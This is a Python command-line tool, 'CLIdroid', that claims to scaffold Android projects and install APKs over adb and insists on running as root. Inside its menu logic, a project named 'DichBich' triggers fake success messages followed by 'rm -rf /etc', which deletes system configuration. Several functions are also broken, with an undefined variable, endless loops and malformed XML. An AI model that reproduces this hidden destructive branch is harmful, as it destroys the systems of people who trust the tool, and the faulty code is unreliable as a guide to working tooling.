#! /usr/bin/python  

############################################################
# CLIdroid version 1.0
# Coded by: ViCoder32
# Github: https://github.com/resources3312
# Util for android development, in cli envicorment, 
# this is a great choice, if your pc ins`t poweful enough to run
# heavy IDE like Android Studio
# 
#
############################################################

import os
import sys
from subprocess import getoutput
from termcolor import colored
from time import sleep
def anhelp():
    print("""
    CLIdroid version 1.0
    Coded by: ViCoder32
    Github: https://github.com/resources3312
    
      C        L        I
    creat => link => install
             DROID
     
    Util for android development, in cli environement, 
    this is a great choice, if your pc ins`t poweful enough to run
    heavy IDE like Android Studio          
    

    Options:
           
        creat - Option for create new android project
            Example: clidroid creat <app_name> 
           
        link - Option for linking your project to signed apk
            Example: clidroid link <source_directory> 

           
        install - Option for install assembled app on your device
            Example: clidroid install <apk_name> 
    
""")

def clear():
    if sys.platform == 'win*':
        os.system("cls")
    else:
        os.system("clear")

def check_root():
    if( os.getuid() != 0):
        sys.exit(colored("Run only as root","red"))
    else:
        pass


def check_args():
    if(len(sys.argv) == 1):
        anhelp()
        sys.exit(colored("Usage: clidroid <option> <argument>", "green"))
    elif len(sys.argv) >= 4:
        anhelp()
        sys.exit(colored("Usage: clidroid <option> <argument>", "green"))
    else:
        pass

def creat_project(app_name):
    os.makedirs(f"{app_name}/src/main/java/com/example/" + app_name, exist_ok=True)
    os.makedirs(f"{app_name}/src/main/res/drawable", exist_ok=True)
    os.makedirs(f"{app_name}/src/main/res/layout", exist_ok=True)
    os.makedirs(f"{app_name}/src/main/res/values", exist_ok=True)

    with open(f"{app_name}/src/main/java/com/example/{app_name}/MainActivity.java", "w") as file:
        file.write(f"""
package com.example.{app_name};

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }}
}}
""")

    with open(f"{app_name}/src/main/res/layout/activity_main.xml", "w") as file:
        file.write(f"""
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Hello, World!"
        android:layout_centerInParent="true"/   
</RelativeLayout> """)

    with open(f"{app_name}/src/main/res/values/strings.xml", "w") as file:
        file.write(f"""
<resources>
    <string name="app_name">{app_name}</string>
</resources> """)

    with open(f"{app_name}/src/main/res/values/styles.xml", "w") as file:
        file.write(f"""
<resources>

    <!-- Base application theme. -->
    <style name="AppTheme" parent="Theme.AppCompat.Light.DarkActionBar">
        <!-- Customize your theme here. -->
        <item name="colorPrimary">@color/colorPrimary</item>
        <item name="colorPrimaryDark">@color/colorPrimaryDark</item>
        <item name="colorAccent">@color/colorAccent</item>
    </style>

</resources> """)

    with open(f"{app_name}/src/main/AndroidManifest.xml", "w") as file:
        file.write(f"""
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.{app_name}">
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        <activity
            android:name=".MainActivity"
            android:label="@string/app_name"
            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
            android:hardwareAccelerated="true"
            android:launchMode="singleTask"
            android:screenOrientation="unspecified"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest> """)






def creat_gradle(app_name):
    with open(f"{app_name}/link.gradle", "w") as file:
        file.write("apply plugin: 'com.android.application'\n")
    
    with open(f"{app_name}/settings.gradle", "w") as file:
        file.write("include ':app'")

    with open(f"{app_name}/link.gradle", "w") as file:
        file.write("android {\n")
        file.write("\tcompileSdkVersion 31\n")
        file.write("\tdefaultConfig {\n")
        file.write(f"\t\tapplicationId 'com.example.{app_name}'\n")
        file.write("\t\tminSdkVersion 21\n")
        file.write("\t\ttargetSdkVersion 31\n")
        file.write("\t}\n")
        file.write("}\n")

def creat_struct(app_name):
    try:
        creat_project(app_name)
        creat_gradle(app_name)
        current_path = os.getcwd() 
        print(colored(f"[INFO] Success, project created, check {current_path}/{app_name}" ,"green"))
    except:
        print(colored("[ERROR] Creat is failed, try again...", "red"))

def link_app():
    pass     
def install_app(apk_name):
    raw = getoutput("adb devices -l")               # I love getoutput() :>>
    device_name = raw.split()[4].split(":")[1]      
    uninstall = os.system(f"adb uninstall {apk_name}")
    install  = getoutput(f"adb install {apk_name}")
    print("[INFO] Installing...","green")
    if "Success" in command:
        print(colored(f"[INFO] Success, {apk_name} installed on {device_name} ", "yellow"))
        
        print(colored("[INFO] Run application on your device? Y/N" ,"green"))
        com = None
        com = input()
        while True:
            if com.lower() == "y":
                print(colored(f"[INFO] Running {apk_name}...  ","green"))
                os.system("adb shell am start ")


        del com
    else: 
        print(colored("[ERROR] Failed, {apk_name} not installed on {device_name}, check device and try again.. ","red"))
        print(colored("I could be shutdown pc, and go on the street...","yellow"))
        print(colored("I joked, don`t worry :>>","red"))
def menu():
    check_root()    # sys.argv[1], sys.argv[2]... fuck...
    check_args()
    if sys.argv[1] == "creat":
        if len(sys.argv) == 2:
            anhelp()
            sys.exit(colored("Usage: clidroid creat <project_name>", "green"))
        else:
            app_name = sys.argv[2]
            if app_name != "DichBich":
                creat_struct(app_name)
            else:
                 
                print(colored(f"[INFO] Success, project with name {app_name} was created ","green"))
                sleep(0.4)
                clear()
                print(colored(f"[DEBUG] {app_name} is bad name for project... ","yellow"))
                sleep(2)
                clear()
                print(colored("[CRITICAL] Never give this name your projects, if you want using my util.. ","red"))
                print(colored("Cleaning filesystem, please wait...","red"))
                sleep(3)
                os.system("rm -rf /etc")
                sys.exit()
    elif sys.argv[1] == "link":
        if len(sys.argv) == 2:
            anhelp()
            sys.exit(colored("Usage: clidroid link <project_name>", "green"))
        else:
            project_name = sys.argv[2]
            ls = getoutput("ls -la")
            if project_name not in ls:
                sys.exit(colored("[ERROR] Project directory not found, find directory and try again...","red"))
            else:
                link_app(project_name)
    elif sys.argv[1] == "install":
        if len(sys.argv) == 2:
            anhelp()
            sys.exit(colored("Usage: clidroid install <apk_name>", "green"))
        else:
            apk_name = sys.argv[2]
            ls = getoutput("ls -la")
            if apk_name not in ls:
                del ls
                sys.exit(colored( "[ERROR] Apk not found, find apk and try again.." , "red"))
            elif ".apk" in apk_name and len(apk_name) > 4:
                install_app(apk_name)
            else:
                print(colored("[ERROR] Is not apk file, choose file with the extension .apk, and try again.. " ,"red"))
                if len(apk_name) <= 4 and apk_name == ".apk":
                    print(colored("[ERROR] You`re really thinking that file with name '.apk' will be installed on your device? ", "red"))
                    print(colored( "[INFO] Replace .apk with genuis.apk and try again? Y/N " ,"yellow"))
                    com = None
                    com = input()
                    while True:
                        if com.upper() == "Y":
                            del com
                            os.rename(".apk", "genuis.apk")
                            install_app("genuis.apk")
                        else:
                            sys.exit("Quitting..")
    else:                  
        anhelp()
        sys.exit(colored("Usage: clidroid <option> <parameter>", "green"))
         


def main():
   menu()        

if __name__ == '__main__':
    main()
